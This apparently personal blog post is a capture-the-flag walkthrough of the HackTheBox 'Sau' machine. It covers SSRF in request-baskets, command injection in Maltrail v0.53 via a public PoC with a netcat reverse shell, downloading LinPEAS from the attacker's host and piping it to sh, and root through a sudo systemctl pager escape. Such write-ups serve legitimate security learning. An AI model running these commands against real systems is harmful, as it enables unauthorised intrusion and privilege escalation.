---
title: "HTB - Sau"
date: "11/10/2024"
description: "Write-up of the Sau machine on HackTheBox."
tags: ["HackTheBox"]
image: "https://shigatena.dev/articles/htb_sau.png"
readingTime: "10"
---

![preview](https://shigatena.dev/articles/htb_sau.png)

## Initial Reconnaissance

First, we initiate a scan of open ports:
```bash
nmap -sC -sV [BOX_IP]
```
This reveals an exposed service at `http://[BOX_IP]:55555/`. Another service is detected on port 80, but it remains inaccessible to us.

Access the URL from your browser to observe the app version is 1.2.1.

## Part One: Exploiting the SSRF Vulnerability

A quick Google search reveals that this version is vulnerable to Server Side Request Forgery (SSRF) on the `/api/baskets/{baskets_name}` endpoint.

We proceed to trigger the SSRF to extract information from the inaccessible port 80:
```bash
curl -L 'http://[BOX_IP]:55555/api/baskets/idklol' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
```
By accessing `http://[BOX_IP]:55555/idklol`, we obtain the leaked webpage which uses Maltrail v0.53.

## Part Two: OS Command Execution Exploit

Another Google search for "Maltrail v0.53 exploit" reveals it is also vulnerable to OS command execution. 

Referencing this PoC: https://github.com/spookier/Maltrail-v0.53-Exploit, we note that the login page is needed to exploit the "username" field. 

To address this, we modify our first vulnerability to redirect traffic to the `/login` endpoint:
```bash
curl -L 'http://[BOX_IP]:55555/api/baskets/idklmao' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
```
We then execute the following command to obtain a session as the user "puma":
```bash
nc -lvnp [YOUR_PORT]
python3 exploit.py [YOUR_IP] [YOUR_PORT] http://[BOX_IP]:55555/idklmao
```
The user flag can be found at `/home/puma/user.txt`. We now need to escalate our privileges.

## Part Three: Privilege Escalation with LinPEAS

To begin, we run LinPEAS, a Linux enumeration tool. Download it from the latest release on GitHub: https://github.com/carlospolop/PEASS-ng/releases/latest and move it into a separate folder.

In order to transfer it to the box, we establish a python server within the directory containing `LinPEAS.sh`:
```bash
sudo python3 -m http.server 80
```
Inside the box, we use `curl` to download it:
```bash
curl http://[YOUR_IP]/linpeas.sh | sh
```
Despite multiple attempts trying out things with LinPEAS output, I didn't find a way to get root at first.

## Part Four: Exploiting Sudo Permissions

After some search, we identify a path to privilege escalation through LinPEAS output:
```sh
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
This indicates that the user has the ability to execute `sudo /usr/bin/systemctl status trail.service`, which triggers a "less" command page style. 

Looking at https://gtfobins.github.io/gtfobins/systemctl/, we learn that: "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate, or maintain privileged access."

If we trigger the command as sudo, our privileges will be maintained when gaining another shell. 
Following the instructions in point c) inside gtfobins, we execute:
```bash
sudo /usr/bin/systemctl status trail.service
```
Then type:
```bash
!sh
```
This provides another shell. We verify our privileges:
```bash
whoami
```
This should output `root`, indicating that we have root-level privileges. 

The flag can be found under `/root/root.txt`.

Happy rooting :)